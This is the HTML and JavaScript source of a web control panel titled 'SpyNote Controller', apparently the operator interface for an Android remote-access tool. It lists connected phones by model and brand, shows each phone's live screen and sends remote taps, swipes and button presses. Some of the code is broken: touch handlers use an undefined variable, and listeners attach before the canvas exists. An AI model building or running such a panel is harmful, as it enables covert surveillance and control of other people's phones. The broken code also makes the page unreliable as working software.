<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpyNote Controller</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #fff; 
            min-height: 100vh; 
            overflow-x: hidden;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        h1 { text-align: center; margin-bottom: 30px; font-size: 2.5em; background: linear-gradient(45deg, #00f5ff, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        
        .devices-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .device { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 25px; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.2); }
        .device:hover { transform: translateY(-10px); box-shadow: 0 20px 40px rgba(0,255,255,0.3); }
        .device.active { background: linear-gradient(45deg, #ff00ff, #00f5ff); box-shadow: 0 0 50px rgba(255,0,255,0.5); }
        .device h3 { margin-bottom: 10px; color: #00f5ff; }
        .device-status { padding: 5px 12px; border-radius: 20px; font-size: 0.85em; font-weight: bold; }
        .status-online { background: rgba(0,255,0,0.2); color: #00ff00; }
        .status-offline { background: rgba(255,0,0,0.2); color: #ff4444; }
        
        .phone-container { display: flex; flex-direction: column; align-items: center; margin-top: 30px; }
        .phone-frame { 
            width: 360px; height: 760px; 
            background: #000; 
            border-radius: 40px; 
            position: relative; 
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            padding: 20px 25px 60px 25px;
        }
        canvas { width: 100%; height: 100%; border-radius: 20px; display: block; }
        .phone-status { margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 15px; text-align: center; }
        .fps-counter { font-size: 1.2em; font-weight: bold; color: #00ff88; }
        
        .controls { display: flex; gap: 15px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }
        .control-btn { padding: 15px 25px; border: none; border-radius: 25px; background: linear-gradient(45deg, #ff6b6b, #ff8e8e); color: white; font-weight: bold; cursor: pointer; transition: all 0.3s; font-size: 1em; }
        .control-btn:hover { transform: scale(1.1); box-shadow: 0 10px 25px rgba(255,107,107,0.4); }
        .control-group { display: flex; gap: 10px; }
        
        .stats { display: flex; justify-content: space-around; margin-top: 20px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; }
        .stat-item { text-align: center; }
        .stat-value { font-size: 2em; font-weight: bold; color: #00f5ff; }
        
        @media (max-width: 768px) { .phone-frame { width: 320px; height: 680px; padding: 15px 20px 50px; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì± SpyNote Controller</h1>
        
        <div class="devices-grid" id="devicesList">
            <div class="device" style="opacity: 0.5;">
                <h3>üîç No Devices</h3>
                <p>Waiting for Android devices...</p>
            </div>
        </div>
        
        <div class="phone-container" id="phoneContainer" style="display: none;">
            <div class="phone-frame" id="phoneFrame">
                <canvas id="screenCanvas"></canvas>
            </div>
            <div class="phone-status">
                <div class="fps-counter" id="fpsCounter">FPS: 0 | 0x0</div>
                <div id="deviceInfo"></div>
            </div>
            
            <div class="controls">
                <div class="control-group">
                    <button class="control-btn" onclick="sendControl('back')">‚Üê Back</button>
                    <button class="control-btn" onclick="sendControl('home')">üè† Home</button>
                    <button class="control-btn" onclick="sendControl('recent')">‚ñ° Recent</button>
                </div>
                <div class="control-group">
                    <button class="control-btn" onclick="sendControl('power')">üîã Power</button>
                </div>
            </div>
        </div>
        
        <div class="stats" id="stats" style="display: none;">
            <div class="stat-item">
                <div class="stat-value" id="latency">0ms</div>
                <div>FPS</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="uptime">0s</div>
                <div>Uptime</div>
            </div>
        </div>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let canvas, ctx, phoneFrame, fpsCounter;
        let frameCount = 0, lastFrameTime = 0;
        let lastFrameReceived = 0;

        // üî• INIT
        window.onload = () => {
            canvas = document.getElementById('screenCanvas');
            ctx = canvas.getContext('2d');
            phoneFrame = document.getElementById('phoneFrame');
            fpsCounter = document.getElementById('fpsCounter');
            
            socket.on('devices-update', updateDevices);
            socket.emit('devices-update');
        };

        // üî• SELECT DEVICE - JOIN ROOM
        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            
            // üî• CRITICAL: JOIN DEVICE ROOM
            socket.emit('join-device', deviceId);
            
            document.getElementById('phoneContainer').style.display = 'block';
            document.getElementById('stats').style.display = 'flex';
            console.log('üé¨ Streaming:', deviceId);
        }

        function updateDevices(devices) {
            const container = document.getElementById('devicesList');
            container.innerHTML = '';
            
            if (devices.length === 0) {
                container.innerHTML = '<div class="device" style="opacity: 0.5;"><h3>üîç No Devices</h3><p>Waiting for Android...</p></div>';
                return;
            }
            
            devices.forEach(([deviceId, info]) => {
                const div = document.createElement('div');
                div.className = `device ${info.connected ? '' : 'offline'}`;
                div.onclick = () => selectDevice(deviceId, div);
                
                div.innerHTML = `
                    <h3>${info.model || 'Unknown'}</h3>
                    <div>ID: ${deviceId.slice(0,12)}...</div>
                    <div>${info.brand || 'Android'} ${info.version || '?'}</div>
                    <div class="device-status ${info.connected ? 'status-online' : 'status-offline'}">
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}
                    </div>
                `;
                container.appendChild(div);
            });
        }

        // üî• PERFECT SCREEN RENDERING
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.imageSmoothingEnabled = true;
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                // FPS & STATS
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    fpsCounter.innerHTML = `FPS: ${fps} | ${data.width}x${data.height}`;
                    document.getElementById('latency').textContent = `${fps} FPS`;
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            
            img.src = `data:image/jpeg;base64,${data.data}`;
        });

        // üî• TOUCH CONTROLS
        let startX, startY;
        canvas.addEventListener('touchstart', e => {
            e.preventDefault();
            const rect = canvas.getBoundingClientRect();
            startX = (e.touches[0].clientX - rect.left) * (canvas.width / rect.width);
            startY = (e.touches[0].clientY - rect.top) * (canvas.height / rect.height);
        });

        canvas.addEventListener('touchmove', e => e.preventDefault());
        canvas.addEventListener('touchend', e => {
            e.preventDefault();
            const rect = canvas.getBoundingClientRect();
            const endX = (e.changedTouches[0].clientX - rect.left) * (canvas.width / rect.width);
            const endY = (e.changedTouches[0].clientY - rect.top) * (canvas.height / rect.height);
            
            if (Math.abs(endX - startX) < 50 && Math.abs(endY - startY) < 50) {
                sendControl('tap', startX/data.width, startY/data.height);
            } else {
                sendControl('swipe', startX/data.width, startY/data.height, endX/data.width, endY/data.height);
            }
        });

        function sendControl(action, x=0, y=0, endX=0, endY=0) {
            if (!currentDevice) return;
            socket.emit('control', {
                deviceId: currentDevice,
                action,
                x, y, endX, endY
            });
        }
    </script>
</body>
</html>
